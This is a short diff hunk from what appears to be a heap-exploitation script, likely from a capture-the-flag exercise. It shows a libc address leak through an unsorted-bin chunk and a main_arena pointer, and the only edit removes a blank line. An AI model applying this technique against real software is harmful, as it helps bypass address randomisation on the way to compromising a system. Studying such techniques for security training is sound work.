@@ -127,7 +127,6 @@ heap_base = initialize()
 
 # Leaking the libc
 unsorted_bin() # Creating an unsorted bin chunk to have a pointer to the main arena on the heap
-
 leak = read(p64(heap_base+2000)) # Reading that pointer
 libc.address = int.from_bytes(leak, "little") - libc.sym["main_arena"] - 96
 #print(f"Libc: {hex(libc.address)}")
